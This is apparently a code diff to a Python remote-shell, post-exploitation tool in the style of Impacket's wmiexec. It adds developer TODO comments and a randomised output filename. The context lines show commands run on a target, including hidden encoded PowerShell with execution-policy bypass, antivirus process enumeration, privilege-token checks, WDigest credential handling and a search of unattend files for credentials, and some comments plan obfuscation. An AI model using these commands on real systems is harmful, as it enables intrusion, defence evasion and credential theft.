@@ -11,7 +11,13 @@ from base64 import b64encode
 import uuid
 from six import PY2
 
-OUTPUT_FILENAME = f"{{{uuid.uuid4()}}}".upper()
+
+uu_one = f"{{{uuid.uuid4()}}}".upper()
+uu_two = f"{{{uuid.uuid4()}}}".upper()
+
+# create permutation function here, different encoding schemes via random chance 
+
+OUTPUT_FILENAME = f"{uu_one}{uu_two}"
 CODEC = sys.stdout.encoding
 
 class RemoteShell(cmd.Cmd):
@@ -22,6 +28,7 @@ class RemoteShell(cmd.Cmd):
         self.__outputBuffer = str('')
         self.__shell = 'cmd.exe /Q /c '
         self.__shell_type = shell_type
+        # call function here that will generate random encoding schemes here 
         self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
         self.__win32Process = win32Process
         self.__transferClient = smbConnection
@@ -196,6 +203,8 @@ class RemoteShell(cmd.Cmd):
             except Exception as e:
                 logging.error(str(e))
 
+    # add md5 before after 
+    # add a progress bar. see how ivan does his 
     def do_lget(self, src_path):
 
         try:
@@ -265,7 +274,9 @@ class RemoteShell(cmd.Cmd):
             except:
                 pass
 
-
+    
+    # add progress bar, see how ivan does his
+    # add md5 before after 
     def do_lput(self, s):
         try:
             params = s.split(' ')
@@ -289,6 +300,8 @@ class RemoteShell(cmd.Cmd):
             logging.critical(str(e))
             pass
 
+
+    # fix this dumpster fire     
     def do_av(self, s):
         try:
             self.execute_remote('tasklist /svc | findstr /i "MsMpEng.exe || WinDefend || MSASCui.exe || navapsvc.exe || avkwctl.exe || fsav32.exe || mcshield.exe || ntrtscan.exe || avguard.exe || ashServ.exe || avengine.exe || avgemc.exe || tmntsrv.exe || kavfswp.exe || kavtray.exe || vapm.exe || avpui.exe || avp.exe"')
@@ -299,6 +312,8 @@ class RemoteShell(cmd.Cmd):
         except:
             pass
 
+
+    # fix this output 
     def do_tokens(self, s):
         self.execute_remote('whoami /priv | findstr /i "Enabled"')
         if len(self.__outputBuffer.strip('\r\n')) > 0: 
@@ -314,6 +329,7 @@ class RemoteShell(cmd.Cmd):
         else:
             logging.info("No Valuable Tokens Found")
         self.__outputBuffer = ''
+
 
     def do_creds(self, s):
         #WDigest 
@@ -390,6 +406,7 @@ class RemoteShell(cmd.Cmd):
             logging.critical(str(e))
             pass
 
+    # an array, ever heard of one...
     def do_unattend(self, s):
         one = r"C:\unattend.txt"
         two = r"C:\unattend.inf"
@@ -581,6 +598,7 @@ class RemoteShell(cmd.Cmd):
         command = self.__shell + data
 
         if self.__noOutput is False:
+            # can you obfuscate this...
             command += ' 1> ' + '\\\\localhost\\%s' % self.__share + self.__output + ' 2>&1'
         if PY2:
             self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
